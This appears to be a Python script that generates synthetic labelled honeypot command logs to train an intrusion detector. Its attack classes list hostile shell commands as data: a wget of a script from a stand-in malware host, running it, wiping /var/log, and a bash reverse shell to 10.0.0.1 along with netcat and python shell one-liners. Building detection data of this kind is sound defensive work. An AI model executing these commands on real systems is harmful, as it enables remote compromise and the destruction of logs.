import pandas as pd
import random
import datetime

def generate_entry(label):
    timestamp = datetime.datetime.now().isoformat()
    src_ip = f"192.168.1.{random.randint(1, 255)}"
    
    if label == 'Normal':
        commands = ['ls', 'pwd', 'id', 'uname -a', 'cat /etc/issue', 'exit']
        cmd = random.choice(commands)
        return {
            'timestamp': timestamp,
            'src_ip': src_ip,
            'input': cmd,
            'label': 'Normal'
        }
    elif label == 'Brute Force':
        # Simulate failed logins (not commands usually, but capturing input)
        inputs = ['admin', 'root', '123456', 'password', 'support']
        cmd = random.choice(inputs)
        return {
            'timestamp': timestamp,
            'src_ip': src_ip,
            'input': cmd,
            'label': 'Brute Force'
        }
    elif label == 'Mirai Botnet':
        commands = [
            'wget http://malware.host/bin.sh', 
            'chmod +x bin.sh', 
            './bin.sh', 
            '/bin/busybox cat /proc/mounts', 
            'rm -rf /var/log'
        ]
        cmd = random.choice(commands)
        return {
            'timestamp': timestamp,
            'src_ip': src_ip,
            'input': cmd,
            'label': 'Mirai Botnet'
        }
    elif label == 'RCE':
        commands = [
            '; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1', 
            'nc -lvp 4444', 
            'python -c "import socket,subprocess,os;..."'
        ]
        cmd = random.choice(commands)
        return {
            'timestamp': timestamp,
            'src_ip': src_ip,
            'input': cmd,
            'label': 'RCE'
        }

def main():
    data = []
    # Generate 1000 entries
    for _ in range(500):
        data.append(generate_entry('Normal'))
    for _ in range(200):
        data.append(generate_entry('Brute Force'))
    for _ in range(200):
        data.append(generate_entry('Mirai Botnet'))
    for _ in range(100):
        data.append(generate_entry('RCE'))
        
    df = pd.DataFrame(data)
    # Shuffle
    df = df.sample(frac=1).reset_index(drop=True)
    
    output_file = 'e:/projects antigrav/honey/data_processing/training_data.csv'
    df.to_csv(output_file, index=False)
    print(f"Generated {len(df)} samples to {output_file}")

if __name__ == "__main__":
    main()
